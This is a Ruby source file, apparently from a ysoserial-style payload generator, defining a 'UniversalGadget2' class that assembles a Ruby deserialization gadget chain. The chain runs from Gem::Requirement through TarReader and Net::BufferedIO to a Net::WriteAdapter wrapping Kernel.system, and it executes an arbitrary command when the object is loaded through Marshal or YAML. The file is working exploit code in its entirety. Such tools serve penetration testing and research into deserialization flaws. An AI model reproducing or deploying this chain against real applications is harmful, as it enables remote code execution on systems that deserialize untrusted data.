require 'ysoserial/gadgets/gadget/base'

class Gem::Requirement
  def marshal_dump
    [@requirements]
  end
end

module YSoSerial
  module Gadgets
    class UniversalGadget2 < YSoSerial::BaseGadget
      def supported_formats
        [:yaml, :marshal]
      end

      def payload
        Gem::SpecFetcher
        wa1 = Net::WriteAdapter.new(Kernel, :system)

        rs = Gem::RequestSet.allocate
        rs.instance_variable_set('@sets', wa1)
        rs.instance_variable_set('@git_set', @cmd)

        wa2 = Net::WriteAdapter.new(rs, :resolve)

        Gem::Installer
        i = Gem::Package::TarReader::Entry.allocate
        i.instance_variable_set('@read', 0)
        i.instance_variable_set('@header', "aaa")

        n = Net::BufferedIO.allocate
        n.instance_variable_set('@io', i)
        n.instance_variable_set('@debug_output', wa2)

        t = Gem::Package::TarReader.allocate
        t.instance_variable_set('@io', n)

        r = Gem::Requirement.allocate
        r.instance_variable_set('@requirements', t)

        [Gem::SpecFetcher, Gem::Installer, r]
      end
    end
  end
end
